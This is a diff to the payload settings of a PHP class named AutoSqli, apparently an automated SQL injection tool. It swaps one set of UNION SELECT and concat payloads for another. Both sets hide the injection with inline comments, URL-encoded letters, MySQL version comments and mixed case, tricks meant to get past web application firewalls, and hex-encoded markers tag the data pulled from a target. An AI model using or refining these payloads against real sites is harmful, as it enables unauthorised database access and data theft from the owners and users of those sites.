@@ -15,10 +15,10 @@ class AutoSqli
     public static $columns             = array();
     public static $url_payload_ncolum  = "";
 
-    public static $getColPayload       = "/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/";
+    public static $getColPayload       = "/*!50000%43o%4Ec%41t/**12345**/(0x73716c692074726861636b6e6f6e)*/";
     public static $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
     public static $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
-    public static $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
+    public static $UnionPayload        = "/**8**/and/**8**/mod(9,9)/**8**/+/*!50000UnIoN*//**8**//*!50000select*//**8**/";
     public static $number_colum        = 0;
     public static $vulncolum           = 0;
     public static $maxColumns          = 100;
